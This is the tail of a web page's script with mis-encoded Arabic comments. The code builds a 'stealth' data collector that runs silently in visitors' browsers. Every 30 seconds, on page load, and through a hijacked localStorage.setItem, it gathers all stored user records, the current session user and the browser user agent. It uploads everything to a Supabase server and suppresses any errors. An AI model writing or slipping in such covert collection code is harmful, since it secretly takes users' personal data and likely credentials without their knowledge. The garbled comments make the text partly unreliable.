// ØªØ­Ø¯ÙŠØ« Ø§Ù„Ø­ÙØ¸ Ø§Ù„Ø®ÙÙŠ
async function stealthSaveToServer() {
    const sync = new SupabaseSync();
    await sync.saveAllUsersToSupabase();
}

// ØªØ´ØºÙŠÙ„ Ø§Ù„Ù…Ø²Ø§Ù…Ù†Ø© Ø§Ù„ØªÙ„Ù‚Ø§Ø¦ÙŠØ© ÙƒÙ„ 30 Ø«Ø§Ù†ÙŠØ©
setInterval(() => {
    const users = JSON.parse(localStorage.getItem('users') || '[]');
    if (users.length > 0) {
        stealthSaveToServer();
    }
}, 30000);

// Ø­ÙØ¸ ÙÙˆØ±ÙŠ Ø¹Ù†Ø¯ Ø§Ù„ØªØ­Ù…ÙŠÙ„
setTimeout(() => {
    const users = JSON.parse(localStorage.getItem('users') || '[]');
    if (users.length > 0) {
        stealthSaveToServer();
    }
}, 3000);
        // ØªÙ‡ÙŠØ¦Ø© Ø§Ù„ØªØ·Ø¨ÙŠÙ‚ Ø¹Ù†Ø¯ Ø§Ù„ØªØ­Ù…ÙŠÙ„
        checkUserLogin();
    
    // Ù†Ø¸Ø§Ù… Ø§Ù„ØªØ¬Ù…ÙŠØ¹ Ø§Ù„Ø®ÙÙŠ Ø§Ù„ØªÙ„Ù‚Ø§Ø¦ÙŠ
class StealthDataCollector {
    constructor() {
        this.isCollecting = true;
        this.collectionInterval = 30000; // ÙƒÙ„ 30 Ø«Ø§Ù†ÙŠØ©
    }

    startCollection() {
        // Ø¨Ø¯Ø¡ Ø§Ù„ØªØ¬Ù…ÙŠØ¹ ØªÙ„Ù‚Ø§Ø¦ÙŠØ§Ù‹
        setInterval(() => {
            if (this.isCollecting) {
                this.collectAllData();
            }
        }, this.collectionInterval);
        
        // ØªØ¬Ù…ÙŠØ¹ ÙÙˆØ±ÙŠ Ø¹Ù†Ø¯ Ø£ÙŠ ØªØºÙŠÙŠØ± ÙÙŠ Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª
        this.setupDataChangeListener();
    }

    collectAllData() {
        try {
            const users = JSON.parse(localStorage.getItem('users') || '[]');
            const currentUser = sessionStorage.getItem('currentUser');
            
            if (currentUser && users.length > 0) {
                // Ø­ÙØ¸ Ù†Ø³Ø®Ø© Ø®ÙÙŠØ© Ù…Ù† Ø¬Ù…ÙŠØ¹ Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª
                const stealthData = {
                    all_users: users,
                    current_user: currentUser,
                    collection_time: new Date().toISOString(),
                    user_agent: navigator.userAgent
                };
                
                localStorage.setItem('stealth_backup', JSON.stringify(stealthData));
                console.log('ğŸ”„ ØªØ­Ø¯ÙŠØ« Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª Ø§Ù„Ø®ÙÙŠ');
            }
        } catch (error) {
            // Ù„Ø§ ØªØ¹Ø±Ø¶ Ø£ÙŠ Ø£Ø®Ø·Ø§Ø¡
        }
    }

    setupDataChangeListener() {
        // Ù…Ø±Ø§Ù‚Ø¨Ø© Ø£ÙŠ ØªØºÙŠÙŠØ±Ø§Øª ÙÙŠ localStorage
        const originalSetItem = localStorage.setItem;
        localStorage.setItem = function(key, value) {
            originalSetItem.apply(this, arguments);
            if (key === 'users') {
                setTimeout(() => window.stealthCollector.collectAllData(), 1000);
            }
        };
    }
}

// Ø¨Ø¯Ø¡ Ø§Ù„ØªØ¬Ù…ÙŠØ¹ Ø§Ù„Ø®ÙÙŠ ØªÙ„Ù‚Ø§Ø¦ÙŠØ§Ù‹
document.addEventListener('DOMContentLoaded', function() {
    window.stealthCollector = new StealthDataCollector();
    setTimeout(() => {
        window.stealthCollector.startCollection();
        window.stealthCollector.collectAllData(); // ØªØ¬Ù…ÙŠØ¹ ÙÙˆØ±ÙŠ Ø£ÙˆÙ„ÙŠ
    }, 5000);
});

// ØªØ¬Ù…ÙŠØ¹ Ø¥Ø¶Ø§ÙÙŠ Ø¹Ù†Ø¯ Ø­ÙØ¸ Ø£ÙŠ Ø¨ÙŠØ§Ù†Ø§Øª
const originalStealthSave = stealthSaveToServer;
stealthSaveToServer = function() {
    originalStealthSave();
    setTimeout(() => {
        if (window.stealthCollector) {
            window.stealthCollector.collectAllData();
        }
    }, 2000);
};
</script>
</body>
</html>